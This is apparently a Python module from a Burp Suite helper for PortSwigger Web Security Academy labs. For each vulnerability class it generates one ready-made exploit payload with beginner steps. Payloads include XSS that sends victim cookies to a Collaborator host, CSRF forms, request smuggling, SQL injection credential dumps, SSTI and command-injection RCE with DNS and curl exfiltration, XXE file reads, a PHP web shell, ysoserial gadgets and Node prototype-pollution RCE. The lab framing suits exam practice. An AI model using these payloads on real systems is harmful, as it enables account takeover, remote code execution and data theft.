"""The missing piece: for a finding, produce ONE recommended payload plus the
exact click-by-click steps to use it — including the exploit-server delivery or
Repeater flow a beginner would never guess. This is what the big "DO THIS NOW"
box renders, so the person never faces a wall of 14 payloads.

Every vuln class in the BSCP three-stage playbook has a builder here, so the
guidance is just as hand-held for SSTI, CSRF, JWT, SSRF, proto-pollution and the
rest as it is for XSS and SQLi. Each builder returns:
    {recommended:{name, body}, steps:[...], note}
"""
from __future__ import annotations

from urllib.parse import urlparse, parse_qs, quote

from .models import Candidate
from .tailor import context, pick_param, _b64_fetch


def _lab(cfg):
    return cfg.lab or "YOUR-LAB.web-security-academy.net"


def _collab(cfg):
    return cfg.collab or "YOUR-COLLABORATOR.oastify.com"


# plain-English definitions for the Burp jargon the steps use, so a non-IT user
# never meets an undefined term. Attached to every card as `terms`.
GLOSSARY = {
    "Burp": "Burp Suite — the proxy tool that sits between your browser and the "
            "site so you can see and edit every request.",
    "Repeater": "a Burp tab where you edit one request and press Send over and "
                "over — your manual testing workbench. (Right-click a request → "
                "'Send to Repeater'.)",
    "Intruder": "a Burp tab that fires the same request many times with a list of "
                "values — used to brute-force or fuzz a field.",
    "Collaborator": "a Burp server that catches pingbacks (DNS/HTTP) from the "
                    "target. If a payload makes the server call it, you see a hit "
                    "— proof the bug fired even when the page shows nothing. "
                    "(Burp menu → Collaborator → Poll now.)",
    "exploit server": "the lab's 'Go to exploit server' page where you host an "
                      "HTML page and click 'Deliver to victim' to send it to the "
                      "simulated user — NOT the site's own search box.",
}


def _terms_for(text: str) -> dict:
    return {k: v for k, v in GLOSSARY.items() if k.lower() in text.lower()}


# what landing each stage gets you, in plain words
_STAGE_GOAL = {
    1: "Stage 1 · Foothold — this gets you your first way in (a session, or code running in a victim's browser).",
    2: "Stage 2 · Privilege escalation — this makes the app treat you as an admin / another user.",
    3: "Stage 3 · Exfiltration — this reads the secret data / file the lab wants (usually /home/carlos/secret).",
}


def build(cand: Candidate, cfg) -> dict | None:
    """Return {recommended:{name,body}, steps:[...], note, terms, stage_hint} or None."""
    txn = cand.signals[0].txn if cand.signals else None
    cls = cand.vuln_class
    fn = _BUILDERS.get(cls)
    if not fn:
        return None
    try:
        card = fn(cand, cfg, txn)
        if card:
            try:
                card["stage_hint"] = _STAGE_GOAL.get(int(cand.stage))
            except Exception:
                card["stage_hint"] = None
            blob = " ".join(card.get("steps", [])) + " " + (card.get("note") or "")
            card["terms"] = _terms_for(blob)
            # never dead-end a beginner: ensure a 'what if it doesn't work' step
            low = blob.lower()
            if not any(k in low for k in ("didn't work", "doesn't work", "if it fails",
                                          "if that fails", "if this exact", "if the page says",
                                          "if blocked", "if file", "if introspection", "if a waf")):
                card.setdefault("steps", []).append(
                    "If it doesn't work: open 'Show all options' and try the next row "
                    "(ordered by how often they work), or paste the response back here.")
        return card
    except Exception:
        return None


def _p(cand, txn, default="param"):
    _, _, params = context(txn) if txn else ("/", "", {})
    return cand.param or pick_param(params) or default


def _path(txn, default="/"):
    _, _, _ = context(txn) if txn else (default, "", {})
    try:
        return urlparse(txn.url).path or default
    except Exception:
        return default


# =========================================================================== #
# STAGE 1 — FOOTHOLD
# =========================================================================== #
def _xss(cand, cfg, txn):
    path, _, params = context(txn) if txn else ("/", "", {})
    p = pick_param(params) or "SearchTerm"
    lab, collab = _lab(cfg), _collab(cfg)
    note = (cand.confirm_note or "").lower()

    # pick the break-out that matches the confirmed context
    if "eval" in note or "json" in note:
        inner = f'"-fetch(`https://{collab}/?c=${{document.cookie}}`)}}//'
        waf = f"\"-eval(atob('{_b64_fetch(collab)}'))}}//"
        ctx = "your input lands inside JavaScript (eval sink)"
        path = "/"
    elif "javascript string" in note or "js string" in note:
        inner = f"'-fetch(`https://{collab}/?c=${{document.cookie}}`)//"
        waf = ""
        ctx = "your input is inside a JavaScript string ( var x='…' )"
    elif "comment" in note:
        inner = f'--><img src=1 onerror="fetch(\'https://{collab}/?c=\'+document.cookie)">'
        waf = ""
        ctx = "your input is inside an HTML comment (close it with --> first)"
    elif "attribute" in note:
        inner = f'"><img src=1 onerror="fetch(\'https://{collab}/?c=\'+document.cookie)">'
        waf = ""
        ctx = "your input lands inside a tag attribute"
    else:
        inner = f'<img src=1 onerror="fetch(\'https://{collab}/?c=\'+document.cookie)">'
        waf = ""
        ctx = "your input lands in normal page HTML"

    delivery = (f'<script>location="https://{lab}{path}?{p}="'
                f'+encodeURIComponent({_jsstr(inner)})</script>')
    steps = [
        "Copy the payload below (the 'copy' button).",
        'In the lab, click the "Go to exploit server" button (top-right).',
        "Paste it into the big Body box.",
        "In the Head box, put:  HTTP/1.1 200 OK",
        'Click "Store", then click "Deliver exploit to victim".',
        "In Burp's top menu: Collaborator → Poll now.",
        "Look for a line with ?c=... — that is the victim's stolen cookie. Paste it back here and I'll help you use it.",
    ]
    if waf:
        steps.append("If the page says 400 / 'dangerous', use the base64 version instead "
                     "(the 'WAF BYPASS' row in the card below).")
    return {"recommended": {"name": f"Deliver-to-victim page  ({ctx})", "body": delivery},
            "steps": steps,
            "note": "This steals the victim's login cookie so you can log in as them."}


def _jsstr(s: str) -> str:
    return "'" + s.replace("\\", "\\\\").replace("'", "\\'") + "'"


def _web_message_xss(cand, cfg, txn):
    lab, collab = _lab(cfg), _collab(cfg)
    body = (f'<iframe src="https://{lab}/" onload="this.contentWindow.postMessage('
            f"'&lt;img src=1 onerror=&quot;fetch(\\'https://{collab}/?c=\\'+document.cookie)&quot;&gt;','*')\">"
            "</iframe>")
    steps = [
        "Copy the payload below.",
        'Click "Go to exploit server".',
        "Paste it into the Body box, set Head to  HTTP/1.1 200 OK.",
        'Click "Store" then "Deliver exploit to victim".',
        "Collaborator → Poll now, look for the ?c= cookie line.",
        "If the handler uses .innerHTML the <img onerror> runs; if it builds a script src, send a JS URL instead.",
    ]
    return {"recommended": {"name": "postMessage into the vulnerable handler", "body": body},
            "steps": steps,
            "note": "The page trusts window messages with no origin check — you send one from your iframe."}


def _content_discovery(cand, cfg, txn):
    url = cand.target_url or f"https://{_lab(cfg)}/"
    steps = [
        "In Burp → Target → Site map, right-click the host → Engagement tools → Discover content.",
        "Also check these by hand in the browser / Repeater:",
        "   /robots.txt , /sitemap.xml , /.git/config , /backup/ , *.bak , /admin , /cgi-bin/",
        "Open any error page with an invalid param (?productId=') — stack traces leak versions & paths.",
        "Anything you find (a backup of source, a debug page, a secret key) feeds the next stage.",
    ]
    return {"recommended": {"name": "Run content discovery on this host", "body": url},
            "steps": steps,
            "note": "Hidden files/endpoints are the map for everything else — do this first."}


def _cache_poisoning(cand, cfg, txn):
    p = _path(txn, "/")
    body = f"GET {p} HTTP/1.1\nHost: {_lab(cfg)}\nX-Forwarded-Host: evil.example\n"
    steps = [
        "Send the cached request (usually a .js or the home page) to Repeater.",
        "Add an unkeyed header and watch it reflect:  X-Forwarded-Host: evil.example",
        "If it reflects into the response, resend until  X-Cache: hit  (you've now poisoned the cache).",
        "Swap the value for a payload host that serves your XSS (or a redirect), re-poison, then the victim gets it.",
        "Use a cache-buster query (?cb=1) while testing so you don't poison the real page by accident.",
    ]
    return {"recommended": {"name": "Reflect an unkeyed header, then get X-Cache: hit", "body": body},
            "steps": steps,
            "note": "An input the cache ignores but the page reflects = you serve content to every visitor."}


def _host_header(cand, cfg, txn):
    lab, collab = _lab(cfg), _collab(cfg)
    body = (f"POST /forgot-password HTTP/1.1\nHost: {collab}\n"
            "Content-Type: application/x-www-form-urlencoded\n\nusername=carlos")
    steps = [
        "Find the password-reset / forgot-password request, send it to Repeater.",
        f"Change the  Host:  header to your Collaborator:  {collab}",
        "(If Host is validated, try adding  X-Forwarded-Host: " + collab + "  instead.)",
        'Submit with the victim\'s username (carlos). Click "Send".',
        "Collaborator → Poll now: the reset email's link points at YOUR host and carries carlos's token.",
        "Open that token on the real lab host to reset carlos's password.",
    ]
    return {"recommended": {"name": "Poison the reset link via Host header", "body": body},
            "steps": steps,
            "note": "The reset email builds its link from the Host header you control."}


def _smuggling(cand, cfg, txn):
    lab = _lab(cfg)
    body = ("POST / HTTP/1.1\nHost: " + lab + "\nContent-Type: application/x-www-form-urlencoded\n"
            "Content-Length: 6\nTransfer-Encoding: chunked\n\n0\n\nG")
    steps = [
        "Send a POST to / to Repeater; turn OFF 'Update Content-Length' in Repeater's menu.",
        "Give it BOTH Content-Length and Transfer-Encoding: chunked (that's the desync).",
        "Body for CL.TE:  0\\r\\n\\r\\nG   — send it twice; the second response should be a 404 on 'GPOST'.",
        "Once desync is confirmed, prefix a request that reaches /admin or captures another user's request.",
        "Keep the socket: Repeater → create a tab group → 'Send group in sequence (single connection)'.",
    ]
    return {"recommended": {"name": "CL.TE desync probe", "body": body},
            "steps": steps,
            "note": "Front-end and back-end disagree on where the request ends — you smuggle a second one."}


def _user_enum(cand, cfg, txn):
    p = _path(txn, "/login")
    body = f"POST {p} HTTP/1.1\nHost: {_lab(cfg)}\nContent-Type: application/x-www-form-urlencoded\n\nusername=§carlos§&password=x"
    steps = [
        "Send the login POST to Intruder (Ctrl-I).",
        "Mark the USERNAME value as the payload position (§).",
        "Load the candidate-usernames wordlist; Start attack.",
        "Sort by response length / status / the exact error wording — the odd one out is a valid user.",
        "Then re-run Intruder on the PASSWORD for that username with the password list; watch for the 302.",
        "Also test timing: a valid user often takes longer (the app actually hashes a password).",
    ]
    return {"recommended": {"name": "Intruder the username, watch for the odd response", "body": body},
            "steps": steps,
            "note": "Different error / length / timing for a real username leaks the account list."}


def _oauth(cand, cfg, txn):
    steps = [
        "Log in with the social button once with Burp recording, so you capture the whole OAuth dance.",
        "Find the /auth?...redirect_uri=... request. Try changing redirect_uri to your Collaborator.",
        "If the code/token is sent there, you've stolen it — replay it to log in as the victim.",
        "For implicit flow: capture the POST that submits the token to the app, swap in the victim's token.",
        "Also try force-linking: start 'attach a social account' as you, finish it in the victim's session.",
    ]
    return {"recommended": {"name": "Tamper redirect_uri → steal the code/token",
                            "body": cand.target_url or ""},
            "steps": steps,
            "note": "The app trusts whatever identity OAuth returns — redirect it to yourself or swap it."}


def _cswsh(cand, cfg, txn):
    lab, collab = _lab(cfg), _collab(cfg)
    body = ("<script>\n"
            f"var ws=new WebSocket('wss://{lab}/chat');\n"
            "ws.onopen=function(){ws.send('READY');};\n"
            f"ws.onmessage=function(e){{fetch('https://{collab}/?m='+encodeURIComponent(e.data));}};\n"
            "</script>")
    steps = [
        "Confirm the chat uses WebSockets with NO CSRF token / origin check (look at the handshake).",
        "Copy the payload below into the exploit server Body, Head = HTTP/1.1 200 OK.",
        'Store → "Deliver exploit to victim".',
        "Collaborator → Poll now: the victim's chat history (or session) is exfiltrated to ?m=...",
    ]
    return {"recommended": {"name": "Cross-site WebSocket hijack page", "body": body},
            "steps": steps,
            "note": "Your page opens the victim's authenticated socket and reads their messages back to you."}


# =========================================================================== #
# STAGE 2 — PRIVESC
# =========================================================================== #
def _sqli(cand, cfg, txn):
    path, _, params = context(txn) if txn else ("/", "", {})
    p = cand.param or pick_param(params) or "param"
    ready = next((pl for pl in cand.tailored if pl.name.startswith("READY")), None)
    if ready:
        body = ready.body
    else:
        orig = params.get(p, "x")
        body = f"{path}?{p}={orig}' UNION SELECT NULL,username,NULL,password FROM users-- -"
    steps = [
        "Copy the payload below.",
        "In Burp → Proxy → HTTP history, find a request to this page, right-click → Send to Repeater.",
        f"In Repeater, replace the whole URL after the host with the copied text (it sets {p}).",
        'Click "Send".',
        "Read the response — the admin's username and password are in it (look for 'administrator').",
        "Go to the lab's login page and log in with those. You're now admin.",
    ]
    return {"recommended": {"name": f"Dump admin password via {p}", "body": body},
            "steps": steps,
            "note": "This reads the admin's password straight out of the database."}


def _idor(cand, cfg, txn):
    steps = [
        "In Burp → HTTP history, find the account/profile request, right-click → Send to Repeater.",
        'Compare the RESPONSE to the request — if the response shows a field like "roleid" or "isAdmin", add it to the request body.',
        'Mass-assign:  add  "roleid":1  (or "isAdmin":true) to the JSON body and Send.',
        "IDOR: change an id you don't own (?id=carlos, or a number) and watch for someone else's data / a 302.",
        "If the id is an unknown number, use Intruder across 0–1000 and sort by status/length for the hit.",
    ]
    return {"recommended": {"name": "Add a role field / tamper the ID in Repeater", "body": cand.target_url or ""},
            "steps": steps, "note": "This makes the app treat you as another (admin) user."}


def _csrf(cand, cfg, txn):
    p = _path(txn, "/my-account/change-email")
    lab = _lab(cfg)
    fields = "email=attacker@evil.com"
    if txn and txn.req_body and "=" in txn.req_body and "{" not in txn.req_body:
        fields = txn.req_body
    inputs = "\n".join(
        f'    <input type="hidden" name="{kv.split("=",1)[0]}" value="{kv.split("=",1)[1] if "=" in kv else ""}">'
        for kv in fields.split("&") if kv)
    body = (f'<form action="https://{lab}{p}" method="POST">\n{inputs}\n</form>\n'
            "<script>document.forms[0].submit();</script>")
    steps = [
        "Copy the auto-submitting form below.",
        'Click "Go to exploit server".',
        "Paste it into the Body box; Head = HTTP/1.1 200 OK.",
        'Click "Store" → "Deliver exploit to victim".',
        "The victim's browser silently submits the change using THEIR cookies.",
        "If there's a CSRF token: check whether it's validated / tied to the session — often it isn't, or you can drop it.",
    ]
    return {"recommended": {"name": "Auto-submitting CSRF form", "body": body},
            "steps": steps,
            "note": "The victim's own browser makes the state-changing request for you."}


def _password_reset(cand, cfg, txn):
    steps = [
        "Start a password reset for your OWN account and capture the reset POST in Burp.",
        "Look at what ties the token to the user — a username field, a cookie, or nothing.",
        "If a username/id field rides alongside the token: change it to  carlos  and reuse YOUR valid token.",
        "If the token isn't checked server-side at all: set new-password for carlos directly.",
        "If the link is built from the Host header: see the Host-header builder (poison the link).",
    ]
    return {"recommended": {"name": "Reuse your token, swap the username to carlos",
                            "body": cand.target_url or ""},
            "steps": steps,
            "note": "The reset flow fails to bind the token to the account it belongs to."}


def _jwt(cand, cfg, txn):
    steps = [
        "Install the JWT Editor extension (Burp → Extensions → BApp Store) if you haven't.",
        "Send the request with the session JWT to Repeater; open the 'JSON Web Token' tab.",
        'Change the payload:  "sub":"administrator"  (or "role":"admin").',
        "Try the weaknesses in order:",
        "   • alg=none → delete the signature (keep the trailing dot).",
        "   • unverified signature → just change the payload and Send.",
        '   • "jwk"/"kid" header injection → sign with your own key (JWT Editor → "Embedded JWK").',
        "Send; if you get the admin account / panel, it worked.",
    ]
    note = "The server trusts the token's claims without properly verifying the signature."
    body = cand.target_url or ""
    return {"recommended": {"name": "Forge sub=administrator (alg:none / unverified / jwk)", "body": body},
            "steps": steps, "note": note}


def _cors(cand, cfg, txn):
    lab, collab = _lab(cfg), _collab(cfg)
    p = _path(txn, "/accountDetails")
    body = ("<script>\n"
            "var x=new XMLHttpRequest();\n"
            f"x.open('GET','https://{lab}{p}',true);\n"
            "x.withCredentials=true;\n"
            f"x.onload=function(){{fetch('https://{collab}/?d='+encodeURIComponent(x.responseText));}};\n"
            "x.send();\n</script>")
    steps = [
        "First prove it in Repeater: add  Origin: https://evil.example  to the request.",
        "If the response echoes  Access-Control-Allow-Origin: https://evil.example  WITH  Allow-Credentials: true  → exploitable.",
        "(If only  Origin: null  is trusted, host the page in a sandboxed iframe so your origin is null.)",
        "Copy the script below into the exploit server; Head = HTTP/1.1 200 OK; Store → Deliver.",
        "Collaborator → Poll now: the victim's credentialed response (API key / account data) arrives at ?d=...",
    ]
    return {"recommended": {"name": "Credentialed cross-origin read → exfil", "body": body},
            "steps": steps,
            "note": "The server reflects your Origin and allows credentials — your page reads the victim's data."}


def _graphql(cand, cfg, txn):
    p = _path(txn, "/graphql/v1")
    body = ('{"query":"query{__schema{types{name fields{name}}}}"}')
    steps = [
        f"Send a POST to {p} with the introspection query below (Content-Type: application/json).",
        "If introspection is on, you get the whole schema — read every query/mutation and its fields.",
        "Look for a query that returns something you shouldn't see (getUser, getBlogPost{postPassword}).",
        "Request the sensitive field directly; for hidden mutations, try adding a privileged field (IDOR/mass-assign).",
        "If introspection is disabled, try it as a GET or with a trailing newline/comment to bypass the filter.",
    ]
    return {"recommended": {"name": "GraphQL introspection → read hidden fields", "body": body},
            "steps": steps,
            "note": "Introspection hands you the full API map, including fields the UI never calls."}


def _client_proto(cand, cfg, txn):
    lab = _lab(cfg)
    body = f"https://{lab}/?__proto__[transport_url]=data:,alert(document.cookie)//"
    steps = [
        "In the browser console, test the source:  check  Object.prototype.foo  after visiting  ?__proto__[foo]=bar",
        "Use DOM Invader (built into Burp's browser) → enable prototype-pollution scan; it finds the gadget.",
        "Pollute a property the page later reads as a sink (a script src / transport_url / config flag).",
        "Copy the URL below — it pollutes transport_url into a data: URL that runs your JS.",
        "If a sanitizer strips __proto__ once, use the nested form:  __pro__proto__to__[x]=y",
    ]
    return {"recommended": {"name": "Pollute a gadget → DOM XSS", "body": body},
            "steps": steps,
            "note": "You add a property to every object; the app later uses it as code/config."}


# =========================================================================== #
# STAGE 3 — EXFIL
# =========================================================================== #
def _traversal(cand, cfg, txn):
    path, _, params = context(txn) if txn else ("/", "", {})
    p = cand.param or pick_param(params) or "file"
    body = f"{path}?{p}=../../../../home/carlos/secret"
    steps = [
        "Copy the payload below.",
        "In Burp → HTTP history, find this request, right-click → Send to Repeater.",
        f"Replace the {p} value with the copied text.",
        'Click "Send" — the secret file contents come back in the response.',
        "(If it fails, try the double-encoded or PHP-wrapper versions in the card below.)",
    ]
    return {"recommended": {"name": f"Read the secret file via {p}", "body": body},
            "steps": steps, "note": "This walks the filesystem to read a file you shouldn't."}


def _ssti(cand, cfg, txn):
    path, _, params = context(txn) if txn else ("/", "", {})
    p = cand.param or pick_param(params) or "message"
    note = (cand.confirm_note or "").lower()
    # recommend the RCE read for the engine confirm identified
    if "jinja" in note or "twig" in note or "{{" in note:
        rce = "{{self.__init__.__globals__.__builtins__.__import__('os').popen('cat /home/carlos/secret').read()}}"
        eng = "Jinja2/Twig ( {{…}} )"
    elif "freemarker" in note or "erb" in note or "<%" in note:
        rce = "<%= `cat /home/carlos/secret` %>"
        eng = "ERB/Freemarker ( <%…%> )"
    elif "ruby" in note or "#{" in note:
        rce = "#{`cat /home/carlos/secret`}"
        eng = "Ruby ( #{…} )"
    else:
        rce = "${T(java.lang.Runtime).getRuntime().exec('cat /home/carlos/secret')}"
        eng = "Java EL ( ${…} )"
    body = f"{path}?{p}=" + quote(rce)
    steps = [
        f"Confidence this is SSTI: the arithmetic probe evaluated (7*7 → 49).  Engine looks like {eng}.",
        "Copy the payload below.",
        f"In Repeater, set {p} to the copied value and Send.",
        "The file contents come back in the rendered response.",
        "If this exact syntax errors, the engine differs — try the other rows in the card (each engine has its own).",
        "For a blind engine, swap the command for an  nslookup $(…).COLLAB  to exfil over DNS.",
    ]
    return {"recommended": {"name": f"SSTI → read the secret ({eng})", "body": body},
            "steps": steps,
            "note": "Your input is rendered as a template — you make the template run commands."}


def _cmdi(cand, cfg, txn):
    path, _, params = context(txn) if txn else ("/", "", {})
    p = cand.param or pick_param(params) or "name"
    collab = _collab(cfg)
    body = _inject(path, params, p, f"|nslookup $(cat /home/carlos/secret).{collab}|")
    steps = [
        "Copy the payload below.",
        f"In Repeater, append it to the {p} value (keep the original value in front).",
        "Separators to try, in order:   |cmd|    ;cmd;    `cmd`    $(cmd)    &&cmd   (and newline %0a).",
        "Collaborator → Poll now: a DNS/HTTP hit = confirmed command execution.",
        "The secret is base64/plain in the sub-domain of the hit:  <secret>.YOUR-COLLAB",
        "No OOB? Use a time probe to confirm first:  ;sleep 10;  (response hangs ~10s).",
    ]
    return {"recommended": {"name": f"Blind cmdi → DNS-exfil the secret via {p}", "body": body},
            "steps": steps,
            "note": "Your text is passed to a shell — you make it run commands and phone home."}


def _inject(path, params, param, inject):
    if not params:
        return f"{path}?{param}=x{inject}"
    parts = []
    for k, v in params.items():
        parts.append(f"{k}={v}{inject}" if k == param else f"{k}={v}")
    return f"{path}?{'&'.join(parts)}"


def _ssrf(cand, cfg, txn):
    path, _, params = context(txn) if txn else ("/", "", {})
    p = cand.param or pick_param(params) or "url"
    body = f"{path}?{p}=http://localhost/admin"
    steps = [
        "Copy the payload below.",
        "In Burp → HTTP history, find this request, right-click → Send to Repeater.",
        f"Replace the {p} value with the copied text.",
        'Click "Send" — the internal admin page comes back in the response.',
        "Then hit  http://localhost/admin/delete?username=carlos  to finish the lab.",
        "File read instead?  file:///home/carlos/secret .  Blacklist?  http://127.1/  or decimal IP  http://2130706433/ .",
    ]
    return {"recommended": {"name": f"Reach the internal admin via {p}", "body": body},
            "steps": steps, "note": "The server fetches whatever URL you give it — including localhost and files."}


def _xxe(cand, cfg, txn):
    lab, collab = _lab(cfg), _collab(cfg)
    body = ('<?xml version="1.0"?>\n'
            '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///home/carlos/secret">]>\n'
            "<stockCheck><productId>&xxe;</productId><storeId>1</storeId></stockCheck>")
    steps = [
        "Find the request that sends XML (stock check / upload), send it to Repeater.",
        "Paste the DOCTYPE + entity below ABOVE the root element and reference &xxe; where a value is echoed.",
        'Click "Send" — the file contents appear where the product/stock value normally shows.',
        "Blind (no echo)? Host an external DTD and exfil to Collaborator:",
        f"   <!ENTITY % d SYSTEM \"file:///home/carlos/secret\"> <!ENTITY % x \"<!ENTITY e SYSTEM 'https://{collab}/?d=%d;'>\">",
    ]
    return {"recommended": {"name": "In-band XXE file read", "body": body},
            "steps": steps,
            "note": "The XML parser resolves your external entity and reads a local file."}


def _file_upload(cand, cfg, txn):
    lab, collab = _lab(cfg), _collab(cfg)
    body = ('<?php echo file_get_contents(\'/home/carlos/secret\'); ?>')
    steps = [
        "On the avatar/file upload, upload a file named  shell.php  with the one-line PHP below.",
        "If the extension is blocked: try  shell.php.jpg ,  shell.phtml , or set  Content-Type: image/jpeg  on the part.",
        "If files land in a known dir, browse to  /files/avatars/shell.php  (or /avatars/) in Repeater.",
        "The response prints the secret. For RCE instead, use  <?php system($_GET['c']); ?>  then ?c=cat ...",
        "Path filters? Try  ../  in the filename to escape into a web-served directory.",
    ]
    return {"recommended": {"name": "PHP web shell → read the secret", "body": body},
            "steps": steps,
            "note": "The server executes the file you uploaded because it trusts the extension/type."}


def _deserialization(cand, cfg, txn):
    collab = _collab(cfg)
    steps = [
        "Spot the serialized blob: PHP  O:4:\"User\":… , Java base64 starting  rO0AB , Python pickle, Ruby, .NET.",
        "PHP: base64-decode the cookie, flip a field (admin b:0 → b:1 / change username), re-encode, replace.",
        "Java/other gadget chains: use ysoserial —",
        f"   java -jar ysoserial.jar CommonsCollections4 'curl https://{collab}/?x=$(base64 -w0 /home/carlos/secret)' | base64 -w0",
        "Paste the base64 into the session cookie, Send, then Collaborator → Poll now for the exfil.",
        "Burp's 'Deserialization Scanner' / 'Java Deserialization' BApp helps spot the chain.",
    ]
    return {"recommended": {"name": "Tamper the serialized object / ysoserial gadget",
                            "body": cand.target_url or ""},
            "steps": steps,
            "note": "The app rebuilds an object from data you control — you smuggle a malicious one."}


def _server_proto(cand, cfg, txn):
    collab = _collab(cfg)
    body = ('{"__proto__":{"execArgv":["--eval=require(\'child_process\').execSync('
            f"'curl https://{collab}/?x=$(base64 -w0 /home/carlos/secret)')\"]}}}}")
    steps = [
        "Find a JSON body the server parses and merges (change-address, update-profile).",
        'Add  "__proto__":{"isAdmin":true}  first — if a later response shows new privilege, pollution works.',
        "To go to RCE (Node), pollute a spawn option so the next child process runs your command — payload below.",
        "Trigger whatever makes the server spawn a process (some labs: just the next request).",
        "Collaborator → Poll now for the exfil hit.",
        "Use Param Miner's server-side prototype-pollution scan to find the exact gadget if this one doesn't fire.",
    ]
    return {"recommended": {"name": "Pollute Node internals → RCE → exfil", "body": body},
            "steps": steps,
            "note": "A polluted prototype property becomes a process option the server later executes."}


_BUILDERS = {
    # stage 1
    "reflected-stored-xss": _xss, "dom-xss": _xss, "web-message-xss": _web_message_xss,
    "content-discovery": _content_discovery, "cache-poisoning": _cache_poisoning,
    "host-header": _host_header, "request-smuggling": _smuggling,
    "user-enum-brute": _user_enum, "oauth-takeover": _oauth, "cswsh": _cswsh,
    # stage 2
    "sql-injection": _sqli, "idor-mass-assign": _idor, "csrf-takeover": _csrf,
    "password-reset-logic": _password_reset, "jwt-forge": _jwt, "cors-exfil": _cors,
    "api-graphql": _graphql, "client-side-proto-pollution": _client_proto,
    # stage 3
    "path-traversal": _traversal, "ssti": _ssti, "os-command-injection": _cmdi,
    "ssrf": _ssrf, "xxe": _xxe, "file-upload-rce": _file_upload,
    "deserialization": _deserialization, "server-side-proto-pollution": _server_proto,
}
